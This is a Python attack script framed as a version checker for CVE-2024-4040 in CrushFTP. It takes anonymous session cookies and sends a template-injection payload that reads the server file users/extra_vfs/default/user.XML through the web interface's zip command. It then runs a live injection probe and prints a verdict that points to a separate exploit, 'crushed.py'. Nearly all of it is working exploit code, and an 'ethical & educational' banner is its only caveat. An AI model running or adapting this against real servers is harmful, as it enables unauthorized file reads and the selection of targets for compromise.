import requests
import argparse
import urllib3
import re
from rich.console import Console
from rich.text import Text
from rich.style import Style
from rich.table import Table
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console(highlight=False)
cyan = Style(color="cyan")
yellow = Style(color="yellow")
violet = Style(color="bright_magenta")
green = Style(color="green")
red = Style(color="red")


def banner():
    console.print(Text("CVE-2024-4040 | CrushFTP Version Checker", style=violet))
    console.print(Text("Purely for ethical & educational purposes only\n", style=yellow))


def check_connectivity(target, session):
    try:
        response = session.get(f"{target}/WebInterface/login.html", verify=False, timeout=5)
        return response.status_code in [200, 404]
    except requests.exceptions.RequestException:
        return False


def grab_cookies(target, session):
    try:
        response = session.get(f"{target}/WebInterface/", verify=False, timeout=5)
        if 'CrushAuth' in response.cookies and 'currentAuth' in response.cookies:
            return response.cookies['CrushAuth'], response.cookies['currentAuth']
    except requests.exceptions.RequestException:
        pass
    return None, None


def get_version(target, session, crush_auth=None, current_auth=None):
    version = "Unknown"

    # Method 1 — CrushFTP API endpoint (most reliable, no auth needed on some versions)
    try:
        response = session.get(
            f"{target}/WebInterface/function/?command=getServerVersion",
            verify=False, timeout=5
        )
        if response.status_code == 200 and response.text.strip():
            match = re.search(r'(\d+\.\d+\.\d+)', response.text)
            if match:
                version = match.group(1)
                console.print(f"[green][+][/green] Version from API: {version}")
                return version
    except requests.exceptions.RequestException:
        pass

    # Method 2 — LFI via SSTI to read defaultsVersion from user.XML (requires cookies)
    if crush_auth and current_auth:
        try:
            headers = {"Cookie": f"CrushAuth={crush_auth}; currentAuth={current_auth}"}
            lfi_url = f"{target}/WebInterface/function/?c2f={current_auth}&command=zip&path=<INCLUDE>users/extra_vfs/default/user.XML</INCLUDE>&names=/a"
            response = session.post(lfi_url, headers=headers, verify=False, timeout=5)
            if response.status_code == 200:
                match = re.search(r'defaultsVersion[^>]*>Version\s+(\d+\.\d+\.\d+)', response.text)
                if match:
                    version = match.group(1)
                    console.print(f"[green][+][/green] Version from user.XML (LFI): {version}")
                    return version
        except requests.exceptions.RequestException:
            pass

    # Method 3 — Scrape login page but exclude JS/CSS filenames to avoid false positives
    try:
        response = session.get(f"{target}/WebInterface/login.html", verify=False, timeout=5)
        # Remove all src= and href= attributes to avoid matching jQuery/CSS versions
        clean_html = re.sub(r'(src|href)=["\'][^"\']*["\']', '', response.text)
        # Look for version in remaining HTML (meta tags, comments, text)
        match = re.search(r'[Vv]ersion[^\d]*(\d+\.\d+\.\d+)', clean_html)
        if match:
            version = match.group(1)
            console.print(f"[yellow][!][/yellow] Version from login page (may be approximate): {version}")
            return version
    except requests.exceptions.RequestException:
        pass

    console.print(f"[yellow][!][/yellow] Could not detect version automatically")
    return version


def is_vulnerable(version):
    if version == "Unknown":
        return None
    try:
        # Strip any build suffix e.g. "10.3.0_34" -> "10.3.0"
        version_clean = version.split("_")[0]
        parts = version_clean.split(".")
        major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2])
        if major == 10 and (minor < 7 or (minor == 7 and patch < 1)):
            return True
        if major == 11 and minor < 1:
            return True
        if major < 10:
            return True  # Very old versions, definitely vulnerable
        return False
    except (ValueError, IndexError):
        return None


def check_ssti(target, crush_auth, current_auth, session):
    try:
        url = f"{target}/WebInterface/function/?c2f={current_auth}&command=zip&path={{hostname}}&names=/a"
        headers = {"Cookie": f"CrushAuth={crush_auth}; currentAuth={current_auth}"}
        response = session.post(url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "{hostname}" not in response.text:
            return True, response.text[:200]
        return False, response.text[:200]
    except requests.exceptions.RequestException as e:
        return False, str(e)


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-4040 CrushFTP Version Checker")
    parser.add_argument("-t", "--target", required=True, help="Target CrushFTP URL (e.g. http://localhost:8080)")
    args = parser.parse_args()

    parsed = urlparse(args.target)
    target = f"{parsed.scheme}://{parsed.netloc}"

    banner()
    session = requests.Session()

    # Step 1 — Connectivity
    console.print(f"[cyan][1/4][/cyan] Checking connectivity to {target}...")
    if not check_connectivity(target, session):
        console.print(f"[red][-][/red] Cannot reach target — is the Docker container running?")
        exit(1)
    console.print(f"[green][+][/green] Target is reachable\n")

    # Step 2 — Grab anonymous cookies (needed for LFI version detection)
    console.print(f"[cyan][2/4][/cyan] Grabbing anonymous session cookies...")
    crush_auth, current_auth = grab_cookies(target, session)
    if crush_auth and current_auth:
        console.print(f"[green][+][/green] Cookies obtained\n")
    else:
        console.print(f"[yellow][!][/yellow] Could not grab cookies — version detection may be limited\n")

    # Step 3 — Version detection
    console.print(f"[cyan][3/4][/cyan] Detecting CrushFTP version...")
    version = get_version(target, session, crush_auth, current_auth)
    vuln = is_vulnerable(version)
    console.print()

    # Step 4 — Live SSTI probe (only if cookies available)
    ssti_result, ssti_response = False, ""
    if crush_auth and current_auth:
        console.print(f"[cyan][4/4][/cyan] Running live SSTI probe...")
        ssti_result, ssti_response = check_ssti(target, crush_auth, current_auth, session)
        if ssti_result:
            console.print(f"[green][+][/green] SSTI confirmed — template evaluated successfully")
        else:
            console.print(f"[red][-][/red] SSTI probe failed — server returned literal string")
        console.print()

    # Output table
    table = Table(title="CrushFTP Recon Result", show_lines=True)
    table.add_column("Field", style="cyan", width=22)
    table.add_column("Result", width=50)

    table.add_row("Target", target)
    table.add_row("CrushFTP Version", version)

    # Vulnerability by version
    if vuln is True:
        table.add_row("Vulnerable (by version)", "[red bold]YES — below patched version[/red bold]")
    elif vuln is False:
        table.add_row("Vulnerable (by version)", "[green bold]NO — patched version[/green bold]")
    else:
        table.add_row("Vulnerable (by version)", "[yellow]UNKNOWN[/yellow]")

    # Vulnerability by live SSTI probe
    if ssti_result:
        table.add_row("Vulnerable (live SSTI)", "[red bold]YES — SSTI confirmed[/red bold]")
    else:
        table.add_row("Vulnerable (live SSTI)", "[green]NO / Unconfirmed[/green]")

    # Final verdict
    if vuln is True or ssti_result:
        table.add_row("VERDICT", "[red bold]VULNERABLE — run crushed.py[/red bold]")
        table.add_row("Next Step", f"python crushed.py -t {target}")
    elif vuln is False and not ssti_result:
        table.add_row("VERDICT", "[green bold]NOT VULNERABLE[/green bold]")
    else:
        table.add_row("VERDICT", "[yellow]INCONCLUSIVE — try crushed.py manually[/yellow]")

    console.print(table)


if __name__ == "__main__":
    main()
